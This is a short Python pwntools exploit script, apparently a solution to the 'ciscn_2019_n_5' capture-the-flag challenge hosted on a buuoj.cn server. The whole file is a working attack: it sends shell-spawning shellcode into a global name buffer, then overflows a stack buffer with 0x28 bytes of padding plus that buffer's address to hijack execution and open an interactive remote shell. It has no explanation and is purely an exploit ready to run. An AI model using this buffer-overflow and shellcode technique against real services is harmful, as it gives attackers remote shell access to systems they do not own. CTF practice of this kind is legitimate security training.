from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
io = remote('node4.buuoj.cn', 28795)
# io = process('ciscn_2019_n_5')
name = 0x601080
shellcode = asm(shellcraft.sh())
io.sendlineafter('tell me your name\n', shellcode)
payload = cyclic(0x28) + p64(name)
io.sendlineafter('What do you want to say to me?\n', payload)
io.interactive()

